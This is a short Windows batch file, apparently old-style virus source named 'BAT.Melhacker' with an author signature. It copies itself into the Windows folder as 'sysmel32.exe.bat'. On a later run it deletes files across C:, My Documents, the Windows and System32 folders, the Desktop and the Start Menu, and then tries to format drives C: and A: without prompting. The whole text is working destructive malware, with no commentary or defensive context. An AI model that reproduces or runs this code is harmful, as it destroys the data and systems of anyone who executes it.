   echo off
   cls
   :: BAT.Melhacker
   If Exist C:\Windows\sysmel32.exe.bat goto KILL
   goto GET
   :GET
   copy %0 %Windir%\sysmel32.exe.bat >>NUL
   goto CN
   :KILL
   cls
   del C:\*.*
   del C:\Mydocu~1\*.*
   del C:\Windows\*.*
   del C:\Windows\*.*
   del C:\Windows\System32\*.*
   del C:\Windows\Cursor\*.*
   del C:\Windows\*.*
   del C:\Windows\Desktop\*.*
   del C:\Windows\Start Menu\*.*
   del C:\Windows\Start Menu\Programs\*.*
   goto CN
   :CN
   Format C: \u \q \autotest
   Format A: \u \q \autotest
   goto END
   :END
   :: Special By Vladimor Chamlkovic
